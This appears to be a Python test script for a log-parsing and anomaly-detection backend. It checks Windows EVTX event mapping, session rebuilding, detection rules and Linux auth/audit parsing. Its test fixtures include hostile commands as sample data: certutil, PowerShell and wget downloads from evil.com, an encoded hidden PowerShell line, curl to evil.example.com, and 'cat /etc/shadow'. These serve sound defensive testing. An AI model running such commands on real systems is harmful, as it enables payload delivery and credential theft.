# -*- coding: utf-8 -*-
"""
一键自检脚本（Day2）：验证会话重建 / 新事件ID / 异常预标记 / 全量导入
====================================================================
用法（在本目录下）:
    python verify_day2.py

与 verify_day1.py 的分工：day1管"Day1产出没被改坏"，day2管"Day2新功能是对的"。
任何一个 [FAIL] 会打印原因，直接把原因发给ZCode就能修。
"""
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent        # backend/b_host_parser/
PROJECT = HERE.parent.parent                  # 仓库根目录
sys.path.insert(0, str(HERE))

results = []


def check(tag, desc, fn):
    """跑一项验证，通过打[OK]，失败打[FAIL]+原因（不中断后面的检查）。"""
    try:
        fn()
        results.append(True)
        print(f"[OK]   {tag}  {desc}")
    except Exception as e:
        results.append(False)
        print(f"[FAIL] {tag}  {desc}")
        print(f"       └─ 原因: {type(e).__name__}: {e}")


# ---------- 合成XML工具：不依赖evtx二进制就能测xml_to_event ----------
def ev_xml(event_id, host="MSEDGEWIN10", ts="2020-09-09T13:18:23.627951Z",
           provider="Microsoft-Windows-Security-Auditing", **data):
    """拼一条evtx记录的XML文本（字段结构照真实Security事件，python-evtx导出格式）。"""
    items = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><Provider Name="{provider}"/><EventID>{event_id}</EventID>'
            f'<TimeCreated SystemTime="{ts}"/><Computer>{host}</Computer></System>'
            f'<EventData>{items}</EventData></Event>')


# ---------- t1：EVENT_TYPES 与 V2 契约文档一致（防再次漂移） ----------
def t1():
    from schema import EVENT_TYPES
    v2 = {
        # 登录与会话
        "login_success", "login_failed", "logout",
        # 进程
        "process_start", "process_end",
        # 网络
        "network_connection", "dns_query", "http_request",
        # 文件
        "file_create", "file_read", "file_write", "file_modify", "file_delete",
        # 注册表
        "registry_set", "registry_create", "registry_delete", "registry_query",
        # 账户与权限
        "user_created", "user_deleted", "user_modified",
        "group_member_added", "group_member_removed", "privilege_change",
        # 服务与计划任务
        "service_created", "service_started", "service_stopped", "service_deleted",
        "scheduled_task_created", "scheduled_task_run", "scheduled_task_deleted",
        # 防御规避（2026-09-08 D确认加入）
        "log_cleared",
    }
    assert len(EVENT_TYPES) == len(set(EVENT_TYPES)), "EVENT_TYPES里有重复词"
    missing = v2 - set(EVENT_TYPES)
    extra = set(EVENT_TYPES) - v2
    assert not missing, f"V2要求但缺失: {missing}"
    assert not extra, f"不在V2词表里(不许私造): {extra}"


check("契约", "EVENT_TYPES与V2冻结词表逐词一致(31词, 含D确认的log_cleared)", t1)


# ---------- t2：任务8b 六个新事件ID + 任务7b 注销事件（合成XML逐个断言） ----------
def t2():
    from windows_evtx import xml_to_event

    # 4634 系统发起注销 → logout，session_id与4624同键
    e = xml_to_event(ev_xml(4634, ts="2020-09-09T14:30:00Z",
                            TargetUserName="IEUser", TargetDomainName="MSEDGEWIN10",
                            TargetLogonId="0x8F1A5", LogonType="2"))
    assert e["event_type"] == "logout" and e["source_event_id"] == 4634
    assert e["session_id"] == "MSEDGEWIN10:0x8F1A5", f"注销也要带配对键: {e['session_id']}"
    assert e["detail"]["logon_id"] == "0x8F1A5" and e["user"] == "IEUser"
    assert e["logon_type"] == 2

    # 4647 用户主动注销 → logout
    e = xml_to_event(ev_xml(4647, ts="2020-09-09T14:31:00Z",
                            TargetUserName="IEUser", TargetLogonId="0x8F1A5"))
    assert e["event_type"] == "logout" and e["session_id"] == "MSEDGEWIN10:0x8F1A5"
    assert "主动" in e["description"]

    # 1102 审计日志被清除 → log_cleared（D确认的正式词）
    e = xml_to_event(ev_xml(1102, ts="2020-09-09T14:35:00Z",
                            SubjectUserName="IEUser", SubjectDomainName="MSEDGEWIN10"))
    assert e["event_type"] == "log_cleared" and e["user"] == "IEUser"
    assert "审计日志被清除" in e["description"] and e["raw_log"]

    # 4720 新建账号 → user_created，user=新账号，detail带操作者
    e = xml_to_event(ev_xml(4720, ts="2020-09-09T14:40:00Z",
                            TargetUserName="hacker", TargetDomainName="MSEDGEWIN10",
                            TargetUserSid="S-1-5-21-1001",
                            SubjectUserName="admin", SubjectLogonId="0x3E7"))
    assert e["event_type"] == "user_created" and e["user"] == "hacker"
    assert e["detail"]["target_user"] == "hacker" and e["detail"]["creator"] == "admin"
    assert e["detail"]["target_sid"] == "S-1-5-21-1001"

    # 4728 成员加入组 → group_member_added；4728里TargetUserName是组名
    e = xml_to_event(ev_xml(4728, ts="2020-09-09T14:41:00Z",
                            MemberName="hacker", MemberSid="S-1-5-21-1001",
                            TargetUserName="Administrators", TargetDomainName="Builtin",
                            SubjectUserName="admin"))
    assert e["event_type"] == "group_member_added"
    assert e["detail"]["group_name"] == "Administrators"
    assert e["detail"]["target_user"] == "hacker" and e["detail"]["member_sid"] == "S-1-5-21-1001"

    # 4673 特权服务调用 → privilege_change
    e = xml_to_event(ev_xml(4673, ts="2020-09-09T14:42:00Z",
                            SubjectUserName="IEUser",
                            ObjectServer="NT Local Security Authority / Authentication Service",
                            ServiceName="LsaRegisterLogonProcess",
                            ProcessName="C:\\Windows\\System32\\svchost.exe",
                            PrivilegeList="-"))
    assert e["event_type"] == "privilege_change" and e["user"] == "IEUser"
    assert e["process"] == "svchost.exe", "4673的进程应从ProcessName路径取文件名"
    assert "privileges" in e["detail"] and "object_server" in e["detail"]

    # 7045 新服务安装 → service_created（System日志提供者，测试provider不影响解析）
    e = xml_to_event(ev_xml(7045, ts="2020-09-09T14:45:00Z",
                            provider="Service Control Manager",
                            ServiceName="evilsvc",
                            ImagePath="C:\\Users\\IEUser\\AppData\\evil.exe",
                            ServiceType="own process", StartType="auto start",
                            AccountName="LocalSystem"))
    assert e["event_type"] == "service_created"
    assert e["detail"]["service_name"] == "evilsvc"
    assert e["detail"]["service_file"] == "C:\\Users\\IEUser\\AppData\\evil.exe"
    assert e["detail"]["start_type"] == "auto start"
    assert e["process"] == "evil.exe", "7045应从ImagePath提取服务可执行文件名"

    # 4698 计划任务创建 → scheduled_task_created（TaskContent本体是XML，测试里用转义后的实体）
    e = xml_to_event(ev_xml(4698, ts="2020-09-09T14:50:00Z",
                            SubjectUserName="IEUser", TaskName="\\evil_task",
                            TaskContent="&lt;Task&gt;&lt;Actions&gt;cmd&lt;/Actions&gt;&lt;/Task&gt;"))
    assert e["event_type"] == "scheduled_task_created"
    assert e["detail"]["task_name"] == "\\evil_task" and e["detail"]["task_content"]
    assert e["user"] == "IEUser"

    # 老三个ID不被改坏（回归）
    e = xml_to_event(ev_xml(4624, ts="2020-09-09T13:00:00Z",
                            TargetUserName="IEUser", LogonType="2", IpAddress="-",
                            TargetLogonId="0x8F1A5"))
    assert e["event_type"] == "login_success" and e["session_id"] == "MSEDGEWIN10:0x8F1A5"
    e = xml_to_event(ev_xml(4625, ts="2020-09-09T13:01:00Z",
                            TargetUserName="IEUser", SubStatus="0xc000006a"))
    assert e["event_type"] == "login_failed" and e["detail"]["substatus_desc"] == "密码错误"
    e = xml_to_event(ev_xml(4688, ts="2020-09-09T13:02:00Z",
                            SubjectUserName="IEUser", NewProcessName="C:\\Windows\\a.exe",
                            CommandLine="ping 1.2.3.4"))
    assert e["event_type"] == "process_start" and e["cmdline"] == "ping 1.2.3.4"


check("任务8b+7b", "8个新事件ID: logout×2/log_cleared/user_created/group_member_added/"
                   "privilege_change/service_created/scheduled_task_created + 老ID回归", t2)


# ---------- t3：任务7b 会话重建 ----------
def t3():
    from windows_evtx import xml_to_event
    from sessions import rebuild_sessions

    def login(user, ip, logon_id, ts, logon_type="3"):
        return xml_to_event(ev_xml(4624, ts=ts, TargetUserName=user,
                                   LogonType=logon_type, IpAddress=ip,
                                   TargetLogonId=logon_id))

    def logout(logon_id, ts):
        return xml_to_event(ev_xml(4634, ts=ts, TargetUserName="IEUser",
                                   TargetLogonId=logon_id, LogonType="3"))

    ev_complete = login("bob", "10.0.2.17", "0x100", "2020-09-09T13:00:00Z")
    ev_logout = logout("0x100", "2020-09-09T14:30:00Z")          # 90分钟会话
    ev_active = login("alice", "-", "0x200", "2020-09-09T13:10:00Z")   # 没等到注销
    ev_orphan = logout("0x300", "2020-09-09T13:20:00Z")          # 没有对应登录

    events = [ev_logout, ev_active, ev_orphan, ev_complete]      # 故意乱序
    events, sess = rebuild_sessions(events)

    assert len(sess) == 2, f"应配出2个会话(有登录的), 实际: {sess}"
    s_bob = next(s for s in sess if s["user"] == "bob")
    s_alice = next(s for s in sess if s["user"] == "alice")
    assert s_bob["complete"] and s_bob["duration_s"] == 5400, f"90分钟=5400秒: {s_bob}"
    assert s_bob["src_ip"] == "10.0.2.17" and s_bob["session_id"] == "MSEDGEWIN10:0x100"
    assert not s_alice["complete"] and s_alice["logout_time"] is None

    # 事件detail被就地补全
    assert ev_complete["detail"]["logout_time"] == ev_logout["timestamp"]
    assert ev_complete["detail"]["session_duration_s"] == 5400
    assert ev_logout["detail"]["login_time"] == ev_complete["timestamp"]
    assert ev_active["detail"]["session_state"] == "active", "没等到注销要标active不是null"
    assert ev_orphan["detail"]["session_state"] == "no_login_record"

    # 按登录时间升序
    assert [s["login_time"] for s in sess] == sorted(s["login_time"] for s in sess)


check("任务7b", "会话重建: 4624↔4634按(host,LogonId)配对算时长 / 未注销标active / 孤儿注销标no_login_record", t3)


# ---------- t4：任务8 异常预标记规则 ----------
def t4():
    from windows_evtx import xml_to_event
    from anomaly import apply_anomaly_rules

    def login(user, ip, ts):
        return xml_to_event(ev_xml(4624, ts=ts, TargetUserName=user,
                                   LogonType="3", IpAddress=ip, TargetLogonId="0x1"))

    def failed(user, ip, ts, sub="0xc000006a"):
        return xml_to_event(ev_xml(4625, ts=ts, TargetUserName=user,
                                   LogonType="3", IpAddress=ip, SubStatus=sub))

    def proc(cmdline, ts):
        return xml_to_event(ev_xml(4688, ts=ts, SubjectUserName="IEUser",
                                   NewProcessName="C:\\Windows\\a.exe", CommandLine=cmdline))

    events = [
        # offhour_login：UTC 19:00Z → UTC+8 是次日凌晨03:00 → 命中
        login("bob", "10.0.2.17", "2020-09-09T19:00:00Z"),
        # 白天登录（UTC+8 上午11点）→ 不命中
        login("bob", "10.0.2.17", "2020-09-09T03:00:00Z"),
        # brute_force：同(user,src_ip) 2分钟内3连败 → 全标
        failed("bob", "10.0.2.17", "2020-09-09T10:00:00Z", sub="0xc000006a"),
        failed("bob", "10.0.2.17", "2020-09-09T10:01:30Z", sub="0xc000006a"),
        failed("bob", "10.0.2.17", "2020-09-09T10:02:00Z", sub="0xc000006a"),
        # 只失败2次 → 不标brute_force
        failed("carol", "10.0.2.18", "2020-09-09T10:00:00Z", sub="0xc000006a"),
        failed("carol", "10.0.2.18", "2020-09-09T10:01:00Z", sub="0xc000006a"),
        # username_enumeration：同src_ip换3个用户名、全是"用户不存在" → 全标
        failed("u1", "10.0.2.99", "2020-09-09T11:00:00Z", sub="0xC0000064"),
        failed("u2", "10.0.2.99", "2020-09-09T11:01:00Z", sub="0xc0000064"),
        failed("u3", "10.0.2.99", "2020-09-09T11:02:00Z", sub="0XC0000064"),
        # 同src_ip但SubStatus是密码错 → 不算枚举
        failed("bob", "10.0.2.77", "2020-09-09T11:00:00Z", sub="0xc000006a"),
        failed("bob", "10.0.2.77", "2020-09-09T11:01:00Z", sub="0xc000006a"),
        # encoded_exec → 命中sev3
        proc("powershell -enc SQBFAFgA -w hidden", "2020-09-09T12:00:00Z"),
        # remote_download → 命中sev2
        proc("certutil -urlcache -f http://evil.com/a.exe a.exe", "2020-09-09T12:05:00Z"),
        proc("powershell -c Invoke-WebRequest http://evil.com/b.exe", "2020-09-09T12:06:00Z"),
        proc("wget http://evil.com/c.exe", "2020-09-09T12:07:00Z"),
        # 正常命令行 → 不命中
        proc("ping 1.2.3.4", "2020-09-09T12:10:00Z"),
        proc("netstat -ano", "2020-09-09T12:11:00Z"),
    ]
    stats = apply_anomaly_rules(events)

    by_flag = {f: [e for e in events if f in e["anomaly_flags"]] for f in stats["by_rule"]}

    # offhour：只命中凌晨那条
    assert len(by_flag["offhour_login"]) == 1, f"offhour应命中1条: {stats}"
    assert by_flag["offhour_login"][0]["timestamp"].startswith("2020-09-10T03")
    # brute_force：3连败全标；carol的2连败不标
    assert len(by_flag["brute_force"]) == 3, f"brute_force应命中3条: {stats}"
    assert all(e["user"] == "bob" for e in by_flag["brute_force"])
    # username_enumeration：3个不同用户同src_ip全标；密码错的组不标
    assert len(by_flag["username_enumeration"]) == 3, f"枚举应命中3条: {stats}"
    assert all(e["src_ip"] == "10.0.2.99" for e in by_flag["username_enumeration"])
    # encoded_exec / remote_download
    assert len(by_flag["encoded_exec"]) == 1 and len(by_flag["remote_download"]) == 3
    # severity取最高：offhour那条=2；brute_force那条=3
    assert by_flag["offhour_login"][0]["severity"] == 2
    assert by_flag["brute_force"][0]["severity"] == 3
    assert by_flag["remote_download"][0]["severity"] == 2
    # 正常事件零标记
    for e in events:
        if e["event_type"] == "process_start" and e["cmdline"] in ("ping 1.2.3.4", "netstat -ano"):
            assert e["anomaly_flags"] == [] and e["severity"] == 0, f"误报: {e['cmdline']}"
    # 统计口径正确：flagged=1+3+3+1+3=11
    assert stats["flagged"] == 11, f"flagged应为11: {stats}"
    # 幂等：再跑一遍结果不变（不重复追加flag）
    stats2 = apply_anomaly_rules(events)
    assert stats2 == stats, f"规则引擎必须幂等: {stats2} vs {stats}"


check("任务8", "异常预标记: offhour/brute_force/username_enumeration/encoded_exec/"
               "remote_download 5规则命中+不误报+severity取最高+幂等", t4)


# ---------- t5：任务9 目录全量导入（含坏文件容错） ----------
def t5():
    import argparse
    import shutil
    import tempfile
    from run_parse import run_dir

    tmp = Path(tempfile.mkdtemp(prefix="verify_day2_"))
    try:
        # 1份好样本 + 1份空evtx（python-evtx对空文件打开即抛异常）：
        # 坏文件必须只丢自己，不能拖垮整批
        shutil.copy(PROJECT / "data" / "sample_logs" / "sample_4624_4625.evtx",
                    tmp / "good_sample.evtx")
        (tmp / "broken.evtx").write_bytes(b"")

        out = tmp / "all_events.jsonl"
        args = argparse.Namespace(file=None, dir=str(tmp), out=str(out),
                                  post=None, limit=None, parser="auto", linux_host=None)
        result = run_dir(args, tmp)   # 内部会打印统计，返回值供断言
        assert result["files"] == 2 and len(result["broken_files"]) == 1, \
            f"坏文件应被识别并跳过: {result}"
        assert result["parsed"] == 4 and result["failed"] == 0, \
            f"好样本应完整解析出4条: {result}"

        lines = [json.loads(l) for l in out.open(encoding="utf-8")]
        assert len(lines) == 4, f"落地文件应有4条: {len(lines)}"
        sess_file = out.with_name("all_sessions.json")
        assert sess_file.exists() and json.loads(sess_file.read_text(encoding="utf-8"))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


check("任务9", "目录全量导入: 损坏文件只丢自己不拖垮整批 / 按文件统计 / 会话json落地", t5)


# ---------- t6：真实跑批产物的全量契约校验 ----------
def t6():
    from schema import STANDARD_FIELDS
    p = PROJECT / "data" / "output" / "all_events.jsonl"
    assert p.exists() and p.stat().st_size > 0, \
        "all_events.jsonl 不存在——先跑 python run_parse.py --dir ..\\..\\data\\sample_logs"
    total = bad = 0
    for line in p.open(encoding="utf-8"):
        ev = json.loads(line)
        total += 1
        if list(ev.keys()) != STANDARD_FIELDS:
            bad += 1
            continue
        if ev["raw_log"] is None or not isinstance(ev["detail"], dict) \
                or not isinstance(ev["anomaly_flags"], list) \
                or not isinstance(ev["severity"], int):
            bad += 1
    assert bad == 0, f"{bad}/{total}条不符合契约"
    assert total >= 20, f"全量导入应≥20条(4份样本), 实际{total}"


check("契约2", "全量跑批产物(all_events.jsonl): 19键齐全+raw_log/detail/flags/severity类型正确", t6)


# ---------- t7：任务6 Linux 解析器（auth + audit原始格式 + audit解释格式） ----------
def t7():
    from linux_log import parse_linux_auth, parse_linux_audit
    from anomaly import apply_anomaly_rules

    auth_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_auth.log"
    audit_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_audit.log"
    interp_path = PROJECT / "data" / "sample_logs" / "linux" / "web-server_audit_interp.log"
    assert auth_path.exists() and audit_path.exists() and interp_path.exists(), "Linux合成样本缺失"

    # --- auth.log：SSH爆破→成功登录的完整片段 ---
    st = {}
    evs = parse_linux_auth(str(auth_path), st)
    assert st["parsed"] == 5 and st["failed"] == 0 and st["skipped_other"] == 3, st
    assert st["by_event_id"] == {"sshd:failed": 4, "sshd:accepted": 1}
    fails = [e for e in evs if e["event_type"] == "login_failed"]
    ok = next(e for e in evs if e["event_type"] == "login_success")
    assert len(fails) == 4 and all(e["src_ip"] == "203.0.113.66" for e in fails)
    assert ok["user"] == "admin" and ok["src_ip"] == "203.0.113.66"
    assert ok["detail"]["src_port"] == 41012 and ok["detail"]["method"] == "password"
    # "invalid user"前缀 → 用户名不存在线索（Linux版的0xC0000064）
    assert any(e["user"] == "oracle" and e["detail"]["invalid_user"] for e in fails)
    # 时间统一UTC+8（auth.log本地时间直接打时区标记）
    assert all(e["timestamp"].endswith("+08:00") for e in evs)
    assert all(e["source"] == "linux_auth" and e["source_event_id"] is None for e in evs)

    # --- audit.log（原始格式）：sudo提权 + 敏感文件访问 + execve兜底 ---
    st2 = {}
    evs2 = parse_linux_audit(str(audit_path), st2)
    assert st2["parsed"] == 5 and st2["failed"] == 0 and st2["skipped_other"] == 1, st2
    assert st2["by_event_id"] == {"USER_CMD": 1, "file_read": 2, "file_write": 1, "execve": 1}, st2
    sudo_ev = evs2[0]
    assert sudo_ev["event_type"] == "process_start"  # D决议：sudo→process_start不加新词
    assert sudo_ev["process"] == "cat" and sudo_ev["detail"]["sudo_command"] == "cat /etc/shadow"
    assert sudo_ev["cmdline"] == "cat /etc/shadow", "sudo命令要填公共字段cmdline（D的TTP匹配用）"
    assert sudo_ev["detail"]["res"] == "success" and sudo_ev["host"] == "web-server"
    fr = [e for e in evs2 if e["event_type"] == "file_read"]
    assert {e["detail"]["file_path"] for e in fr} == {"/etc/shadow", "/etc/passwd"}
    shadow = next(e for e in fr if e["detail"]["file_path"] == "/etc/shadow")
    assert shadow["detail"]["audit_key"] == "sensitive", "audit规则key要保留（E配置的监控点）"
    assert shadow["process"] == "cat" and shadow["detail"]["syscall"] == "open"
    # 写模式（hex flags 0x41 = O_WRONLY|O_CREAT）→ file_write，D的外传/落盘匹配用
    fw = next(e for e in evs2 if e["event_type"] == "file_write")
    assert fw["detail"]["file_path"] == "/etc/cron.d/persist" and fw["detail"]["open_flags"] == "0x41"
    assert "写入" in fw["description"]
    # execve没有EXECVE记录时：process从exe取，cmdline如实null（不造假）
    nc = next(e for e in evs2 if e["event_type"] == "process_start" and e["process"] == "nc")
    assert nc["cmdline"] is None and nc["detail"]["exe"] == "/tmp/nc"
    assert all(e["detail"]["audit_serial"] for e in evs2), "auditd事件都要带审计序号（溯源+去重键）"

    # --- 解释格式（ausearch -i，E真实数据的形态）：中文时间戳+名字字段 ---
    st3 = {}
    evs3 = parse_linux_audit(str(interp_path), st3, host="ubuntu-vm")
    assert st3["parsed"] == 4 and st3["failed"] == 0 and st3["skipped_other"] == 1, st3
    assert st3["by_event_id"] == {"file_read": 1, "execve": 1, "connect_inet": 1,
                                  "SERVICE_START": 1}
    f1 = next(e for e in evs3 if e["event_type"] == "file_read")
    assert f1["timestamp"] == "2026-09-08T10:06:41.516000+08:00", f"中文时间戳: {f1['timestamp']}"
    assert f1["detail"]["file_path"] == "/home/mxy/case01-core/data/finance_demo.txt", \
        "相对路径要和CWD拼成绝对路径"
    assert f1["user"] == "mxy" and f1["detail"]["audit_key"] == "case01_demo_file"
    p1 = next(e for e in evs3 if e["detail"].get("audit_serial") == 531)
    assert p1["event_type"] == "process_start" and p1["process"] == "curl"
    assert p1["cmdline"] == "curl http://evil.example.com/x.sh" and p1["user"] == "mxy"
    n1 = next(e for e in evs3 if e["detail"].get("audit_serial") == 532)
    assert n1["event_type"] == "network_connection"
    assert n1["dst_ip"] == "192.168.1.102" and n1["dst_port"] == 80, \
        f"SOCKADDR hex要解出IP:端口: {n1['dst_ip']}:{n1['dst_port']}"
    svc = next(e for e in evs3 if e["event_type"].startswith("service_"))
    assert svc["event_type"] == "service_started" and svc["detail"]["service_name"] == "evil-backdoor"

    # --- 异常规则对Linux事件生效 + 跨文件去重 ---
    stats = apply_anomaly_rules(evs + evs2)
    assert stats["by_rule"]["brute_force"] == 3, f"root三连败应命中: {stats}"
    assert stats["by_rule"]["offhour_login"] == 1, f"凌晨02:55登录应命中: {stats}"
    assert stats["flagged"] == 4
    from run_parse import dedupe_linux_audit
    merged = evs3 + parse_linux_audit(str(interp_path), {})   # 同一文件解析两遍=跨文件重复场景
    deduped, removed = dedupe_linux_audit(merged)
    assert removed == 4 and len(deduped) == 4, f"按审计序号去重: removed={removed}"


check("任务6", "Linux解析: sshd登录 / audit原始+解释双格式(中文时间戳) / sudo USER_CMD(hex解码) / "
               "execve→process_start带cmdline / open→file_read(CWD拼绝对路径) / inet connect→network_connection / "
               "SERVICE_START / 异常规则生效 / 跨文件去重", t7)


# ---------- 汇总 ----------
print("-" * 56)
if all(results):
    print(f"全部验证通过：{sum(results)}/{len(results)} 项 [OK]")
else:
    print(f"有 {results.count(False)} 项未通过，把 [FAIL] 的原因发给ZCode即可修")
    sys.exit(1)
